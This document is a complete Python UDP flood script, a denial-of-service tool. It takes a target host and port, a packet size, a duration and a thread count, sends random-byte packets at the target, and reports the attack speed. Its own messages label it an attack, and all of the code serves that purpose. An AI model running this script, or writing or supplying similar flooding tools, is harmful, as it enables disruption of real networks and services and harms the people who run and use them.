#!/usr/bin/python
# -*- coding: utf-8 -*-
import socket
import sys
import time
import random
import threading

LOCK = threading.Lock()

try:
    sys.argv[6]
except Exception as e:
    print('[Error] Incorrect Usage!')
    print('\tCorrect usage: {host}, {port},  {packet size (bytes)},  {duration of attack}, {# of threads}, {time to sleep in between threads (seconds)}')
    print('\tPlease Note: data cannot be separated by spaces!')
    quit()


class Attack:

    def __init__(
        self,
        host,
        port,
        data,
        time,
        threads,
        sleep_time,
        ):
        self.host = host
        self.port = int(port)
        self.packet_size = int(data)
        self.data = random._urandom(int(data))
        self.threads = int(threads)
        self.time = float(time)
        self.sleep_time = float(sleep_time)
        self.t1 = 0

    def send_packets(self):
        self.packets_sent = 0
        self.t1 = time.time()
        for x in range(self.threads):
            thread = threading.Thread(target=self.send_packets_worker)
            thread.start()
            thread.join()
        print('[+] Attack finished!')
        print('[+]: Results:')
        print('\tPackets sent: {}'.format(self.packets_sent))
        print('\tData sent: {}MB'.format((self.packets_sent
               * self.packet_size) / 1000000))
        print('\tAttack Duration: {} seconds'.format(self.time))
        print('\tAttack Speed: {} MB/S'.format(((self.packets_sent * self.packet_size) / 1000000) / self.time))



    def send_packets_worker(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            sock.sendto(self.data, (self.host, self.port))
            t2 = time.time()
            if t2 - self.t1 >= self.time:
                break
            with LOCK:
                self.packets_sent += 1
            time.sleep(self.sleep_time)

if __name__ == '__main__':
    atk = Attack(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6])
    print('[+] Initialized input data!')
    print('[+] Commencing attack...')
    atk.send_packets()
